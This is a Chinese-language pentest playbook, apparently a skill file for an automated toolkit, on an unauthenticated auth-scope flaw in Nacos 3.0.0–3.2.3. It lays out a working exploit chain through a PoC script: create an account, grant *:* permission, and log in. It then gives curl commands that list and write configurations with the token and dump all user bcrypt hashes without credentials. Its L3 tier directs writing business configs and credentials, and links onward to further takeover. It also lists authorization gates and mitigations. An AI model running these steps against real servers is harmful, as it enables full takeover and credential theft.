---
name: 纳言无门
description: >-
  Nacos 3.x（3.0.0~3.2.3）鉴权作用域错配：UserControllerV3/RoleControllerV3/PermissionControllerV3
  落在默认关闭的 OPEN_API 作用域，无需任何凭证即可建号 → 绑自定义角色 → 发 *:* 权限 → 登录 → 读写全部配置，
  等价完整接管。3.2.4 修复。
  
  默认 L2 读配置；建号前先 --check-only 确认；不得改生产 admin 密码。
---

# Nacos 3.x 鉴权作用域错配（未授权自建管理员）

**影响版本**：3.0.0 ~ 3.2.3 | **修复版本**：3.2.4 | **端口**：8848

## 漏洞原理

`@Secured` 的 `apiType` 默认值是 `OPEN_API`（开关 `nacos.core.auth.enabled`，默认 **关**）。
UserV3/RoleV3/PermissionV3 三个控制器的注解都漏写了 `apiType`，导致这三条接口被默认关闭的过滤器放行。
即使按文档把 `admin.enabled` 和 `console.enabled` 全开，这三个接口仍不鉴权。

## 何时用

- 目标出现 `/nacos/v3/auth/user`、`/nacos/v3/auth/role`、`/nacos/v3/auth/permission`
- Nacos 控制台版本显示 3.0.x ~ 3.2.3
- Spring Gateway 链 Nacos 出口段遇到 v3 API
- `nday_route` 或 Spring Gateway 全链扫描命中 `nacos_config_chain`，且版本 ≥ 3.0

## 授权闸门

```bash
# 确认目标在 scope（SSRF 打到的内网 IP 先扩权）
python3 炼蛊房/scope_expand.py --grant <域名或IP> --case <案卷> --note "Nacos 3.x authscope"
```

## 强制步骤

### 1. 无损探测（必须先跑）

```bash
python3 炼蛊房/nacos_authscope_poc.py --host <授权IP> --port 8848 --check-only
# 退出码 0 = 漏洞存在；2 = 已修复；1 = 连接失败
```

`--check-only` 只读探测：`GET /nacos/v3/auth/user/list` 无 token 返回 200 且 body 含 `{"code":0,"data":{"pageItems":[...]}}` 即判为阳性，**全程不建账号、不写入**。

### 2. 完整利用链（L2 可验证）

```bash
python3 炼蛊房/nacos_authscope_poc.py \
  --host <授权IP> --port 8848 \
  --case <案卷>
# 默认：建号 → 绑角色 → 发 *:* 权限 → 登录 → 列配置/写标记 → 自动清理账户
# 如需保留账号（拿 accessToken 继续回灌）加 --no-cleanup
```

### 3. 以 token 读写配置

```bash
# 列全部 namespace 配置
curl -s "http://<IP>:8848/nacos/v3/admin/cs/config/list?pageNo=1&pageSize=100" \
  -H "accessToken: $TOKEN"

# 写标记（只写 marker，禁止覆盖生产配置）
curl -s -X POST "http://<IP>:8848/nacos/v3/admin/cs/config" \
  -H "accessToken: $TOKEN" \
  --data-urlencode "dataId=pentest-marker.txt" \
  --data-urlencode "groupName=DEFAULT_GROUP" \
  --data-urlencode "namespaceId=public" \
  --data-urlencode "content=authscope-poc-verified"
```

### 4. 落证据

```bash
# 拖全部用户名+bcrypt hash（GET 未授权，无损）
mkdir -p 案卷/<案卷>/nacos
curl -s "http://<IP>:8848/nacos/v3/auth/user/list?pageNo=1&pageSize=100" | \
  python3 -m json.tool > 案卷/<案卷>/nacos/nacos_users.json
```

脚本自动落盘路径：`案卷/<案卷>/nacos/nacos_authscope_<时间戳>.json`；更新 `STATUS.md`。

## 成功口径

| 级 | 口径 |
|----|------|
| L1 | `/v3/auth/user/list` GET 无 token 返回 2xx + 用户列表 |
| L2 | 建号→绑角色→发权限→登录→列 admin 配置 **全链跑通**，accessToken 落盘 |
| L3 | 用 token 写入业务配置（DB/Redis/下游凭据），回灌业务链；**授权内直接做** |

## 不要做

- 绑定 `ROLE_ADMIN`（服务端业务层会拦，且触发告警）
- 覆盖/删除生产配置（先问）
- 改原 admin 密码
- 打完不清理（默认 `--no-cleanup` 关闭 = 自动删账号）
- 未扩权就打内网 IP

## 临时缓解（告知甲方）

- 升级到 **3.2.4**
- 升级前：`nacos.core.auth.enabled=true`（OPEN_API 也鉴权）
- 网关层：把 8848 的 `/v3/auth/*` 限到可信来源

## 衔接

- 拿到配置 → `ENC(...)` Jasypt 解密 → `spring-actuator-cloud-takeover`
- 配置含 DB/Redis 凭据 → 回灌业务/假支付链
- 同机 Web → 对象矩阵 + `linux-post-exploit`

## 参考

- PoC 源码：`炼蛊房/nacos_authscope_poc.py`
- Playbook：`传承/纳言·无门.md`
- 上游 PoC：[mhtsec/nacos-authscope-poc](https://github.com/mhtsec/nacos-authscope-poc)
- 修复 diff：[Nacos 3.2.4 release](https://github.com/alibaba/nacos/releases/tag/3.2.4)
